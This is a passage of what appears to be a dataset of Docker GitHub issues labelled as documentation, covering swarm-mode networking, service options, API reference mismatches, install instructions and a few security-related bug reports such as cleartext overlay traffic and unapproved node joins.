nodes in swarm mode and an overlay network.  \n\nI notice the task names are predictably networktest.1, .2, .3:\n\n```\n$ docker service tasks networktest\nID                         NAME           SERVICE      IMAGE   LAST STATE         DESIRED STATE  NODE\nd6naj58s8izkb822fpd4b6tl0  networktest.1  networktest  alpine  Running 4 seconds  Running        ip-172-31-47-32.us-west-2.compute.internal\n7sglm20hhbmn1ws5fiqvqfgx5  networktest.2  networktest  alpine  Running 4 seconds  Running        ip-172-31-43-158.us-west-2.compute.internal\nau4unlfyavw5y6vhodaw2dwe4  networktest.3  networktest  alpine  Running 4 seconds  Running        ip-172-31-43-158.us-west-2.compute.internal\n```\n\nbut the container names have a random suffix:\n\n```\n[ec2-user@ip-172-31-47-32 ~]$ docker ps\nCONTAINER ID        IMAGE                           COMMAND                  CREATED             STATUS              PORTS                                  NAMES\ne67110a596b0        alpine:latest                   \"sleep 36000\"            5 minutes ago       Up 5 minutes                                               networktest.1.d6naj58s8izkb822fpd4b6tl0\n```\n\nand\n\n```\n[ec2-user@ip-172-31-43-158 ~]$ docker ps\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\n412ed90a1cd7        alpine:latest       \"sleep 36000\"       4 minutes ago       Up 3 minutes                            networktest.2.7sglm20hhbmn1ws5fiqvqfgx5\n44ea273ba889        alpine:latest       \"sleep 36000\"       4 minutes ago       Up 3 minutes                            networktest.3.au4unlfyavw5y6vhodaw2dwe4\n```\n\nHow are we then supposed to have container-to-container communication?\n\nSo giving that full randomly-generated name allows one container to ping another:\n\n```\n[ec2-user@ip-172-31-47-32 ~]$ docker exec -it e67110a596b0 ping networktest.2.7sglm20hhbmn1ws5fiqvqfgx5\nPING networktest.2.7sglm20hhbmn1ws5fiqvqfgx5 (10.0.0.4): 56 data bytes\n64 bytes from 10.0.0.4: seq=0 ttl=64 time=0.319 ms\n64 bytes from 10.0.0.4: seq=1 ttl=64 time=0.236 ms\n64 bytes from 10.0.0.4: seq=2 ttl=64 time=0.217 ms\n```\n\n_But_ I really wish this worked too:\n\n```\n[ec2-user@ip-172-31-47-32 ~]$ docker exec -it e67110a596b0 ping networktest.2\nping: bad address 'networktest.2'\n```\n\nI didn't see any parameters to `docker service create` for `links`, so how do I configure one container to communicate with another? \n\nIn [this blog](https://blog.docker.com/2016/06/docker-1-12-built-in-orchestration/) it implied the `frontend` and `redis` database would be connected with just the following commands. Was that misleading?\n\n```\ndocker network create -d overlay mynet\ndocker service create --name frontend --replicas 5 -p 80:80/tcp --network mynet mywebapp\ndocker service create --name redis --network mynet redis:latest\n```\n"},{"labels":["documentation",null],"text":"this is a raft cluster, so there needs to be a quorum of nodes available for the cluster to function\nif nodes have their address change at random, it will potentially disturb that quorum and be hard to recover from\nin production you would ​_never_​ deploy this in a way where managers aren't reachable at a fixed address (or DNS name). but maybe we can come up with a hack for laptop use that makes it more usable.\n"},{"labels":["documentation",null],"text":"The https://docs.docker.com/engine/swarm/key-concepts/ mentions  **\"By default manager nodes are also worker nodes, but you can configure managers to be manager-only nodes.\"**, I was not able to find how to configure the swarm managers to be manager-only nodes, maybe I missed something, but could someone shed some light on this? Thanks.\n"},{"labels":["documentation",null],"text":"The \"--privileged\" flag does a lot \"under the hood\"; apart from enabling all capabilities, it also disables apparmor profiles, seccomp profiles, etc.\n\nWe should document exactly what the flag does, so that people can make better decisions if they need it (or not)\n"},{"labels":["documentation",null],"text":"I have been unable to find any documentation or examples for the mount configuration option on the [docker service create](https://docs.docker.com/engine/reference/commandline/service_create/) command.  How do you express the source, target, driver and driver plugin specific options?\n"},{"labels":["documentation",null,null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n(NOTE: attempted with both 'testing' and 'experimental' ubuntu repositories\n\n```\nosboxes@worker3:~$ docker version\nClient:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd-unsupported\n Built:        Fri Jun 17 21:12:28 2016\n OS/Arch:      linux/amd64\n Experimental: true\n\nServer:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd-unsupported\n Built:        Fri Jun 17 21:12:28 2016\n OS/Arch:      linux/amd64\n Experimental: true\n```\n\n**Output of `docker info`:**\n\n```\nosboxes@worker3:~$ docker info\nContainers: 12\n Running: 2\n Paused: 0\n Stopped: 10\nImages: 11\nServer Version: 1.12.0-rc2\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 66\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: overlay host null bridge\nSwarm: active\n NodeID: aat8ei7yd02du6f7qh47aykk5\n IsManager: No\nRuntimes: default\nDefault Runtime: default\nSecurity Options: apparmor seccomp\nKernel Version: 4.4.0-28-generic\nOperating System: Ubuntu 16.04 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 2\nTotal Memory: 2.751 GiB\nName: worker3\nID: 3PJ2:Q4UW:FPJI:URH4:7J2N:ZBTJ:3G54:YOF6:UP35:AIGW:QS7F:HZOJ\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\nExperimental: true\nInsecure Registries:\n 127.0.0.0/8\nosboxes@worker3:~$ docker version\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\nVMware fusion VM's. tested with 2 and 3 separate VM's in a swarm\n\n**Steps to reproduce the issue:**\n1. docker swarm init; #other host;  docker swarm join ip:2377\n2. Create overlay network:\n`docker network create -d overlay my-test-network`\n3. Deploy docker containers to test. I did a quick and dirty deploy of base ubuntu images, and installed tools within them. \n`docker service create --network my-test-network --replicas 3 --name networktest ubuntu:latest sleep 36000`\n4. docker inspect ContainerID to get IP addresses of containers on network\n5. Run tcpdump on docker node (i.e. ubuntu VM) or hypervisor (i.e. mac desktop) to watch traffic on port 4789\n`sudo tcpdump -s 1500 -A -i ens37 port 4789`\n6. Observe that traffic is in cleartext (i.e. install nginx on one container in the service, then install curl on another, and grab the default page. \n\n**Describe the results you received:**\nTraffic when inspected via tcpdump is in cleartext (i.e. http traffic is clearly visible)\n\n**Describe the results you expected:**\nExpected to see encapsulated traffic. Not sure if this is expected and I'm not testing this correctly, or what. I.e. do I need two physically separate hosts, mirror a switch port, and watch traffic there, and/or is bridge mode networking within the mac/vmware fusion confusing things?\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n"},{"labels":["documentation"],"text":"On the [Getting started with swarm mode](https://docs.docker.com/engine/swarm/swarm-tutorial/#/the-ip-address-of-the-manager-machine) page, we just need to remove `Tip: Docker recommends that every node in the cluster be on the same layer 3 (IP) subnet with all traffic permitted between nodes.` towards the bottom of the page since there is no broadcast domain constraint. Ping @thaJeztah \n\nThanks!\n"},{"labels":["documentation"],"text":"cfr.: https://github.com/docker/docker/issues/24076#issuecomment-229734136\n\n@sfsmithcha @tiborvass \n"},{"labels":["documentation",null,null],"text":"**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd\n Built:        Fri Jun 17 20:35:33 2016\n OS/Arch:      linux/amd64\n Experimental: true\n\nServer:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd\n Built:        Fri Jun 17 20:35:33 2016\n OS/Arch:      linux/amd64\n Experimental: true\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 8\n Running: 8\n Paused: 0\n Stopped: 0\nImages: 228\nServer Version: 1.12.0-rc2\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 761\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge null overlay host\nSwarm: active\n NodeID: bzk4vv65idjvtxi09gdqtfwbd\n IsManager: Yes\n Managers: 1\n Nodes: 1\n CACertHash: sha256:c0fdf51a4eaa403e7119c77001349cf6bc025542e166179a7ae3ba50f5b422f9\nRuntimes: default\nDefault Runtime: default\nSecurity Options: apparmor seccomp\nKernel Version: 3.16.0-73-generic\nOperating System: Ubuntu 14.04.4 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 31.06 GiB\nName: j-think\nID: OCMX:LCWD:ZLEO:SGYW:ZWUQ:YLI3:TPPY:4ZLH:GBXC:PKJ2:FNNF:TOOL\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nUsername: johnharris85\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\nExperimental: true\nInsecure Registries:\n 127.0.0.0/8\n```\n\n**Steps to reproduce the issue:**\n1. `docker swarm init`\n2. `docker swarm inspect`\n\n**Describe the results you received:**\nI see only the worker marked to auto-accept into the swarm.\n\n**Describe the results you expected:**\nI expect to see both manager and work set to auto-accept into the swarm as per the documentation here: https://docs.docker.com/engine/reference/commandline/swarm_init/.\n\nWhat's the desired behaviour here? I'm happy to submit a PR for either the docs or the swarm defaults. Personally think the current behavior should stay and docs should be updated (seems like a sensible default).\n"},{"labels":["documentation"],"text":"It would be nice if the documentation contains best practices for operating swarm managers.\n\nFor example:\n- Are swarm managers like mesos masters which needs to be operated in odd numbers to maintain quorum?\n- What is the maximum number of managers you should have in a swarm? Are they like Zookeeper ensembles where as the number of members in the ensemble increases, the write performance decreases?\n- Is it advisable to make every node a manager, so that we can administrate the swarm from any node?\n- Can swarm be run in high availability mode? If so, is there an example?\n"},{"labels":[null,"documentation",null,null,null,null],"text":"Taken from the CLI reference page of `docker node tasks`:\n\n> The `name` filter matches on all or part of a task's name.\n\nThis is wrong. The filtering is applied on the **exact service name**, see example below.\n\nI think this is actually more useful than filtering on task names and therefore propose to **change the filter name from `name` to `service`**.\n\nFurthermore, filtering should be extended to also cover substring matches, not only exact matches.\n\n``` bash\n$ docker service create --name top busybox top\n7ieif28g1smw7ppav7wiausmz\n\n# a task with name top.1 was created on this node\n$ docker node tasks self\nID                         NAME   SERVICE  IMAGE    LAST STATE          DESIRED STATE  NODE\nbrscnd76m5eh8l3cvmpt5lkj4  top.1  top      busybox  Running 51 seconds  Running        bd4242800842\n\n# filtering by part of the task's name does not find the task\n$ docker node tasks --filter name=to self\nID  NAME  SERVICE  IMAGE  LAST STATE  DESIRED STATE  NODE\n\n# filtering by the task's exact name does not find the task\n$ docker node tasks --filter name=top.1 self\nID  NAME  SERVICE  IMAGE  LAST STATE  DESIRED STATE  NODE\n\n# ==> only filtering by the SERVICE's name finds the task <==\n$ docker node tasks --filter name=top self\nID                         NAME   SERVICE  IMAGE    LAST STATE              DESIRED STATE  NODE\nbrscnd76m5eh8l3cvmpt5lkj4  top.1  top      busybox  Running About a minute  Running        bd4242800842\n\n$ docker version\nClient:\n Version:      1.12.0-dev\n API version:  1.25\n Go version:   go1.6.2\n Git commit:   83e6197-unsupported\n Built:        Tue Jun 28 20:00:19 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.0-dev\n API version:  1.25\n Go version:   go1.6.2\n Git commit:   83e6197-unsupported\n Built:        Tue Jun 28 20:00:19 2016\n OS/Arch:      linux/amd64\n```\n"},{"labels":["documentation",null,null],"text":"**Output of `docker version`:**\nroot@xxxxx:~# docker version\nClient:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd\n Built:        Fri Jun 17 21:09:07 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd\n Built:        Fri Jun 17 21:09:07 2016\n OS/Arch:      linux/amd64\n\nroot@xxxxx:~# docker-compose version\ndocker-compose version 1.8.0-rc1, build 9bf6bc6\ndocker-py version: 1.8.1\nCPython version: 2.7.9\nOpenSSL version: OpenSSL 1.0.1e 11 Feb 2013\n\n**Output of `docker info`:**\nContainers: 49\n Running: 0\n Paused: 0\n Stopped: 49\nImages: 109\nServer Version: 1.12.0-rc2\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 246\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge overlay null host\nSwarm: active\n NodeID: 34lgngb2j2iufvk046th0p6qq\n IsManager: Yes\n Managers: 1\n Nodes: 3\n CACertHash: sha256:4dd1a761493f5ef3fcaa783113b85b935a7686cc954f5507af9b3743b87cd5b9\nRuntimes: default\nDefault Runtime: default\nSecurity Options: apparmor seccomp\nKernel Version: 3.16.0-30-generic\nOperating System: Ubuntu 14.04.2 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 2\nTotal Memory: 1.955 GiB\nName: pek2-gosv-16-dhcp226\nID: 2B4M:L4M2:6Q3A:HLAU:3CNJ:JA7I:34T3:NRBA:BGY6:RY5A:4AS3:AC6L\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nHttp Proxy: xxxx.some.com:1234\nHttps Proxy: xxxx.some.com:1234\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\nInsecure Registries:\n 127.0.0.0/8\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n\n**Steps to reproduce the issue:**\n0. Prepare three ubuntu14.04 machines, here I used VMware VMs\n1. Upgrade docker engine to v1.12rc2\n2. (Optional)Upgrade docker compose 1.8.0-rc1 (I could also reproduce this issue on earlier version such as  v1.6.1GA)\n3. create a swarm cluster with 1 manger node and 2 slave nodes,  as documented in v1.12 swarm-mode doc. Here in my network setup, \"ingress\" is swarm created overlay network\npengzhencao@pek2-gosv-16-dhcp226:~/docker/docker$ docker node list\nID                           NAME                  MEMBERSHIP  STATUS  AVAILABILITY  MANAGER STATUS\n34lgngb2j2iufvk046th0p6qq \\*  pek2-gosv-16-dhcp226  Accepted    Ready   Active        Leader\n37fmlm52xw0iy7k6zoo5j09px    pek2-gosv-16-dhcp160  Accepted    Ready   Active\n61lw7iskl9ivnxaveby8dfaf1    pek2-gosv-16-dhcp45   Accepted    Ready   Active\npengzhencao@pek2-gosv-16-dhcp226:~/docker/docker$ docker network list\nNETWORK ID          NAME                DRIVER              SCOPE\n8b94d08c0f67        bridge              bridge              local\n74b71c054864        deploy_default      bridge              local\nabd08b2c6c5d        docker_gwbridge     bridge              local\n651d9df026eb        host                host                local\n7oywymoz6bbp        ingress             overlay             swarm\n18e3039be16b        none                null                local\n1. On the swarm manager node, edit docker-compose.yml file with the following settings:\n   version: '2'\n   services:\n   log:\n     build: ./log/\n     volumes:\n       - /var/log/harbor/:/var/log/docker/\n     ports:\n       - 1514:514\n   ....(some other services)\n   networks:\n   default:\n     external:\n       name: ingress\n2. run with \"docker-compose up\"\n\n**Describe the results you received:**\npengzhencao@pek2-gosv-16-dhcp226:~/harbor/Deploy$ docker-compose up\nRecreating deploy_log_1\nERROR: for log  swarm-scoped network (ingress) is not compatible with `docker create` or `docker run`. This network can be only used docker service\nERROR: Encountered errors while bringing up the project.\n**Describe the results you expected:**\nDocker compose should deploy the services up with overlay network \"ingress\"\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nI've followed swarm and docker-compose integration guide here:\nhttps://docs.docker.com/compose/networking/\n\nThe above error seems to be thrown in L356:\nin  docker/daemon/container_operations.go\n330 func errClusterNetworkOnRun(n string) error {\n331         return fmt.Errorf(\"swarm-scoped network (%s) is not compatible with `docker create` or `docker run`. This network can be only used     docker service\", n)\n332 }\n333\n334 // updateContainerNetworkSettings update the network settings\n335 func (daemon _Daemon) updateContainerNetworkSettings(container *container.Container, endpointsConfig map[string]_networktypes.EndpointSetti    ngs) error {\n336         var (\n337                 n   libnetwork.Network\n338                 err error\n339         )\n340\n341         mode := container.HostConfig.NetworkMode\n342         if container.Config.NetworkDisabled || mode.IsContainer() {\n343                 return nil\n344         }\n345\n346         networkName := mode.NetworkName()\n347         if mode.IsDefault() {\n348                 networkName = daemon.netController.Config().Daemon.DefaultNetwork\n349         }\n350         if mode.IsUserDefined() {\n351                 n, err = daemon.FindNetwork(networkName)\n352                 if err != nil {\n353                         return err\n354                 }\n355                 if !container.Managed && n.Info().Dynamic() {\n356                         return errClusterNetworkOnRun(networkName)\n357                 }\n358                 networkName = n.Name()\n359         }\n360 \n"},{"labels":["documentation"],"text":"The use of constraints should be documented in the reference. While https://github.com/docker/docker/blob/master/docs/reference/commandline/service_create.md says that the `--constraint` flag exists when creating a service, it is unclear how this is to be used and whether the same usage as docker/swarm applies.\n\nIt would also be nice to have a few examples showing how this is to be used.\n"},{"labels":[null,"documentation",null,null],"text":"`docker service scale`... Why is the _the only_ parameter which can be updated through both a first-class command _and_ through `docker service update`?  Isn't that a bit inconsistent?\n\nI know that it was this way in Docker Compose, but is including Docker Compose vestiges in the new `docker swarm` _really_ a good idea?  Will this inclusion of a Docker Compose vestige set a user expectation for `docker swarm` to imitate Compose closely in other ways as well?\n\nHere's our last chance to pull it, before it becomes canon and removing it breaks hundreds of shell scripts.  Feel free to close if I'm way off mark here.\n\n@aluzzardi @vieux @dnephin @abronan \n"},{"labels":["documentation",null],"text":"According to the engine-api Docs, resource settings are \"NanoCPUs\" and \"MemoryBytes\" - https://godoc.org/github.com/docker/engine-api/types/swarm#Resources\n\nThe corresponding docs for the remote API show simply \"CPU\" and \"Memory\" https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.24.md#create-a-service\n"},{"labels":[null,"documentation"],"text":"On `Docker version 1.11.2, build b9f10c9`, both `POST /v1.23/containers/<container ID>/exec` and `POST /v1.23/exec/<exec ID>/start` have the following body:\n\n``` json\n{\n  \"AttachStderr\": true,\n  \"AttachStdin\": true,\n  \"AttachStdout\": true,\n  \"Cmd\": [\n    \"true\"\n  ],\n  \"Container\": \"<container ID>\",\n  \"Detach\": false,\n  \"DetachKeys\": \"\",\n  \"Privileged\": false,\n  \"Tty\": true,\n  \"User\": \"\"\n}\n```\n\nOn `Docker version 1.12.0-rc2, build 906eacd, experimental`, both `POST /v1.24/containers/<container ID>/exec` and `POST /v1.24/exec/<exec ID>/start` have the following body:\n\n``` json\n{\n  \"AttachStderr\": true,\n  \"AttachStdin\": true,\n  \"AttachStdout\": true,\n  \"Cmd\": [\n    \"true\"\n  ],\n  \"Detach\": false,\n  \"DetachKeys\": \"\",\n  \"Privileged\": false,\n  \"Tty\": true,\n  \"User\": \"\"\n}\n```\n\nNote that the bodies are different -- the v1.23 body includes the container ID. This change doesn't appear in the Remote API documentation.\n"},{"labels":["documentation"],"text":"#23790 added support for this as an environment variable `DOCKER_SERVICE_PREFER_OFFLINE_IMAGE` to support our integration tests.\n\nWe should figure out if we want to:\n- document this\n- make it configurable in some other way\n- use digest or image IDs to avoid pulling if local image is present.\n\nI'd prefer not to rush this for 1.12 timeframe.\n\n@vdemeester \n"},{"labels":["documentation",null],"text":"When rendering a left nav where selections in that area render pages in the main content area, it's important to have a clear indication in the left nav where the user is.  That is, where the content for the main content area came from.\n\nI imagine I could find many examples of this, but I'm currently looking at [Docker networks feature overview](https://docs.docker.com/engine/userguide/networking/).  I would provide a screenshot, but imagebin isn't working for me right now.\n\nWhat I see on the screen indicates that I might be somewhere in the \"User Guide\" section, and I imagine that I know this page is talking about networking, so I might be somewhere around the \"Network configuration\" section, but the rendering of the left nav isn't helping me here.\n"},{"labels":["documentation",null],"text":"On the documentation page [_Automatically start containers_](https://docs.docker.com/engine/admin/host_integration/) the example for a [systemd](https://freedesktop.org/wiki/Software/systemd/) [service unit](https://docs.docker.com/engine/admin/host_integration/#systemd) with `docker run` is given as below.\n\n```\n[Service]\n…\nExecStart=/usr/bin/docker run --env foo=bar --name redis_server redis\nExecStop=/usr/bin/docker stop -t 2 redis_server ; /usr/bin/docker rm -f redis_server\n…\n```\n\nThis should be changed to the example below, using `ExecStopPost`.\n\n```\n[Service]\n…\nExecStart=/usr/bin/docker run --env foo=bar --name redis_server redis\nExecStop=/usr/bin/docker stop -t 2 redis_server\nExecStopPost=/usr/bin/docker rm -f redis_server\n…\n```\n\nFrom the [manual](https://www.freedesktop.org/software/systemd/man/systemd.service.html):\n\n> `ExecStop=`\n> \n> It is recommended to use this setting for commands that communicate with the service requesting clean termination. When the commands specified with this option are executed it should be assumed that the service is still fully up and is able to react correctly to all commands. For post-mortem clean-up steps use ExecStopPost= instead.\n> \n> `ExecStopPost=`\n> \n> Additional commands that are executed after the service is stopped. This includes cases where the commands configured in ExecStop= were used, where the service does not have any ExecStop= defined, or where the service exited unexpectedly. This argument takes multiple command lines, following the same scheme as described for ExecStart=. Use of these settings is optional. Specifier and environment variable substitution is supported. Note that – unlike ExecStop= – commands specified with this setting are invoked when a service failed to start up correctly and is shut down again.\n> \n> It is recommended to use this setting for clean-up operations that shall be executed even when the service failed to start up correctly. Commands configured with this setting need to be able to operate even if the service failed starting up half-way and left incompletely initialized data around. As the service's processes have been terminated already when the commands specified with this setting are executed they should not attempt to communicate with them.\n\nSo to ensure, that the Docker container is really deleted, and the service will start up again, after an unclean shutdown, that means the Docker container is stopped, but is still around, the Docker container deletion command should be in the directive `ExecStopPost=`.\n"},{"labels":["documentation",null],"text":"Feedback on Debian install from John Clements clements@brinckerhoff.org\n\nOn the Debian install page,\n\nhttps://docs.docker.com/engine/installation/linux/debian/\n\nStep 3 of the “update your apt” section reads:\n\n $ apt-get purge lxc-docker*\n $ apt-get purge docker.io*\n\nUnfortunately, on some shells, the globber will get ahold of the asterisk and try to find files in the local directory starting with lxc-docker, which isn’t what you want at all. Instead, this should probably read:\n\n $ apt-get purge \"lxc-docker_\"\n $ apt-get purge “docker.io_”\n\nThen, later, you suggest obtaining the signing key for the project with\n\n $ apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118 E89F3A912897C070ADBF76221572C52609D\n\nThis timed out for me repeatedly, but I tried\n\n $ apt-key adv --keyserver hkp://pool.sks-keyservers.net:80 --recv-keys 58118 E89F3A912897C070ADBF76221572C52609D\n\n… and that worked fine. Dunno if this is a transient failure, but I’m guessing the more general address is probably more robust.\n\nFinally, and this is minor, you might want to replace the calls to `service` with calls to `systemctl`.\n\nThanks!\n\nJohn Clements\n"},{"labels":["documentation"],"text":"On your blog, you said the file extension .dab. but in the github repo, your file extension .dsb\n\nwhat's different with two file extension?\n\nhttps://blog.docker.com/2016/06/docker-app-bundle/\n\n![selection_034](https://cloud.githubusercontent.com/assets/278153/16214910/a5a46042-378f-11e6-99f8-4d1ed45ba41d.png)\n\nhttps://github.com/docker/docker/blob/master/experimental/docker-stacks-and-bundles.md\n![selection_035](https://cloud.githubusercontent.com/assets/278153/16214913/bb3ce226-378f-11e6-9fe5-72dfebe093ed.png)\n"},{"labels":[null,"documentation",null,null,null],"text":"**Output of `docker version`:**\n\nClient (laptop, OSX)\n\n```\n$> docker version\nClient:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd\n Built:        Fri Jun 17 20:35:33 2016\n OS/Arch:      darwin/amd64\n Experimental: true\n\nServer:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   a7119de\n Built:        Fri Jun 17 22:09:20 2016\n OS/Arch:      linux/amd64\n Experimental: true\n```\n\nServer:\n\n```\nClient:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd-unsupported\n Built:        Fri Jun 17 21:21:56 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.0-rc2\n API version:  1.24\n Go version:   go1.6.2\n Git commit:   906eacd-unsupported\n Built:        Fri Jun 17 21:21:56 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\nClient:\n\n```\nContainers: 78\n Running: 0\n Paused: 0\n Stopped: 78\nImages: 51\nServer Version: 1.12.0-rc2\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 344\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: overlay bridge null host\nSwarm: inactive\nRuntimes: default\nDefault Runtime: default\nSecurity Options: seccomp\nKernel Version: 4.4.13-moby\nOperating System: Alpine Linux v3.4\nOSType: linux\nArchitecture: x86_64\nCPUs: 4\nTotal Memory: 1.954 GiB\nName: moby\nID: AX3N:B5KC:6TY6:V5UW:5MAH:JSD3:PXBN:HC3H:GF3L:GC7L:Z35R:KAIW\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): true\n File Descriptors: 33\n Goroutines: 95\n System Time: 2016-06-20T22:09:37.819574454Z\n EventsListeners: 1\nNo Proxy: *.local, 169.254/16\nRegistry: https://index.docker.io/v1/\nExperimental: true\nInsecure Registries:\n 127.0.0.0/8\n```\n\nServer (swarm cluster):\n\n```\nContainers: 0\n Running: 0\n Paused: 0\n Stopped: 0\nImages: 0\nServer Version: 1.12.0-rc2\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 0\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: overlay host null bridge\nSwarm: inactive\nRuntimes: default\nDefault Runtime: default\nSecurity Options: apparmor seccomp\nKernel Version: 4.4.0-24-generic\nOperating System: Ubuntu 16.04 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 1\nTotal Memory: 991.1 MiB\nName: docker1\nID: LOR7:TUJW:PXCF:SGKX:L5LU:GQCT:UTRN:G72M:JU32:I24J:JN3R:BN34\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nInsecure Registries:\n 127.0.0.0/8\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n\n**Steps to reproduce the issue:**\n1. Set up a remote swarm cluster - mine is 4 remote nodes, 2 leaders\n2. On your laptop, run:\n\n```\n$> docker swarm join swarmIP:2377\nThis node joined a Swarm as a worker.\n```\n1. On the leader:\n\n```\ndocker node ls\nID                         NAME     MEMBERSHIP  STATUS  AVAILABILITY  MANAGER STATUS\n09y7cdu03xmuwhta0ykvd72gb  docker4  Accepted    Ready   Active        Reachable\n1jkzrkblwbdig3l5u29997n00  docker1  Accepted    Ready   Active        Leader\n41znz1ntskwvvvea8up52wu0m  docker2  Accepted    Ready   Active        \n5bt1bcak4tuzm9a39a7ou9upz  docker3  Accepted    Ready   Active        \n7ljlfo1zqcid0mc8cmir64i6g  moby     Accepted    Ready   Active \n```\n\n**Describe the results you received:**\n\nMy 'rogue' laptop was able to join the swarm cluster as a worker and shows up in the manager list as ready and active.\n\n**Describe the results you expected:**\n\nI expected the join command to require approval from a manager node as it does in manager mode\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n"},{"labels":["documentation"],"text":"Per @thaJeztah , verify correct version of api docs post-1.12 release. Ref https://github.com/docker/docker/pull/23777 .\n"},{"labels":["documentation"],"text":"Review consistency of CLI reference with the code on the new commands:\n- `docker node`\n- `docker service`\n- `docker swarm`\n"},{"labels":["documentation"],"text":"Review consistency of API reference with the code on the new endpoints:\n- Node endpoints\n- Service endpoints\n- Swarm endpoints\n"},{"labels":[null,"documentation",null],"text":"**Output of `docker version`:**\n\n```\nClient:\n Version:      1.11.2\n API version:  1.23\n Go version:   go1.5.4\n Git commit:   b9f10c9\n Built:        Wed Jun  1 22:00:43 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.11.2\n API version:  1.23\n Go version:   go1.5.4\n Git commit:   b9f10c9\n Built:        Wed Jun  1 22:00:43 2016\n OS/Arch:      linux/amd64\n\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 4\n Running: 0\n Paused: 0\n Stopped: 4\nImages: 4\nServer Version: 1.11.2\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 15\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins: \n Volume: local\n Network: bridge null host\nKernel Version: 4.4.0-22-generic\nOperating System: Ubuntu 16.04 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 4\nTotal Memory: 7.676 GiB\nName: maxnoe-mac\nID: AJ2Z:G6U4:LKAZ:PXNC:PBBJ:7B73:BM6B:NYTX:JZAS:XW6H:VAV2:7XDM\nDocker Root Dir: /var/lib/docker\nDebug mode (client): false\nDebug mode (server): false\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit suppor\n```\n\n**Steps to reproduce the issue:**\n1. Try logging in to a registry with self signed certificates\n\n```\ndocker login myregstry.example.com:5000\n```\n\nThis worked with docker `1.9` on my machine because I have `--insecure-registry myregistry.example.com:5000` added to the `DOCKER_OPTS` in `/etc/defaults/docker`.\nAlso I registered the certificate system wide. `curl` works without providing the certificate explicitly\n\n**Describe the results you received:**\n`Error response from daemon: Get https://registry.e5.physik.tu-dortmund.de:5000/v1/users/: x509: certificate signed by unknown authority`\n\nOr, when 